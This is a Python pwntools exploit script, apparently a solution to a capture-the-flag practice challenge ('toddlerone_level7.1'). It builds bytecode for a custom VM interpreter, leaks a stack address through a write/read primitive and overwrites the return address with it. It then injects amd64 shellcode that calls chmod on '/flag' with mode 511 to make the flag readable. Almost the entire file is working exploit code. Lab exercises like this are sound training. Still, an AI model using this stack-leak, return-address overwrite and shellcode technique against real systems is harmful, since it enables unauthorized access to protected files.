from pwn import *
from pyrsistent import b 
context.arch='amd64'
reg = {'a': b'\x10' , 'b':b'\x02' , 'c':b'\x01', 'd':b'\x40', 's':b'\x08', 'i':b'\x04', 'f':b'\x20/'}
ins = {'sys': b'\x20', 'imm' : b'\x80'}
systable = {'crash':b'\x10','read':b'\x02','read_300' : b'\x20' , 'write' :b'\x08'}
def imm(regNo, imm):
    return reg[regNo] +  int.to_bytes(imm,1,'little')  + ins['imm']

def read_300(fd,offset,count,ret_regNo):
    payload = b''
    payload += imm('a',fd) # fd
    payload += imm('b',offset) # buffer_offset
    payload += imm('c',count) # count
    payload = payload  + systable['read_300'] + reg[ret_regNo] + ins['sys']

    return payload 

def read_0(fd,offset,count,ret_regNo):
    payload = b''
    payload += imm('a',fd) # fd
    payload += imm('b',offset) # buffer_offset
    payload += imm('c',count) # count
    payload = payload + systable['read_300'] + reg[ret_regNo] + ins['sys'] 

    return payload 

def write_300(fd,offset,count,ret_regNo):
    payload = b''
    payload += imm('a',fd) # fd
    payload += imm('b',offset) # buffer_offset
    payload += imm('c',count) # count
    payload = payload + systable['write'] + reg[ret_regNo] + ins['sys']

    return payload 

def exit(v):
    payload = b''
    payload += imm('a',v)
    payload += b'\x01\x08\x00'

    return payload

r = process('/challenge/toddlerone_level7.1')

payload2=asm('''
    push 90
    pop rax
    lea rdi, [rip+f]
    mov rsi, 511
    syscall

    f:
    .string "/flag"
''')



payload = b''

payload += write_300(1,0xff,0xff,'d')
payload += read_300(0,0xff,0xff,'d')
payload += imm('i',0xff)
r.send(payload)
r.recvuntil(b'Starting interpreter loop! Good luck!\n')
r.recv(0x19)
### ret
r.recv(16)
## stack
stack = u64(r.recv(8)) - 232
print(hex(stack))

r.send(b'\x00' + b'\x01'*5 + b'\xff' + b'\x01'*2 + b'\x00'*0x10 + p64(stack) + payload2)



r.interactive()